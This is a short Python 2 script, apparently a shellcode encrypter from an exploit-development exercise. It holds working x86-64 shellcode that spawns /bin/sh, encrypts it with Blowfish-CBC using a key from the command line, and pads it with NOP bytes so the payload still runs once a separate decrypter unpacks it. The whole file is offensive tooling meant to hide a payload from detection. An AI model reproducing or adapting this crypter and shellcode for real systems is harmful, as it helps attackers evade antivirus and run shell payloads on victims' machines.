#!/usr/bin/env python

#Import everything for crypto stuff

from Crypto.Cipher import Blowfish
from Crypto import Random
from struct import pack
import sys

#put your shellcode here:

shellcode=("\x48\x89\xc3\x48\x29\xd8\x48\x89\x44\x24\xf8\x48\x83\xec\x08\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

#Default implementation from https://www.dlitz.net/software/pycrypto/api/current/Crypto.Cipher.Blowfish-module.html of the blowfish crypto using pycrypt

bs = Blowfish.block_size
key = sys.argv[1] 
iv = Random.new().read(bs)
cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)

#Here we check if the shellcode needs some padding
plen = bs - divmod(len(shellcode),bs)[1]


#default it pads it using the code in the comments here, but we changed that to just pad with NOPS so our shellcode will still run when it is decrypted later
'''
padding = [plen]*plen
padding = pack('b'*plen, *padding)
'''
msg = iv + cipher.encrypt(shellcode + "\x90"*plen)

#The encrypted shellcode together with the iv is printed (without \n) and can be copied to the decrypter

for x in bytearray(msg):
    sys.stdout.write('\\x%02x' %x)

print '\n'
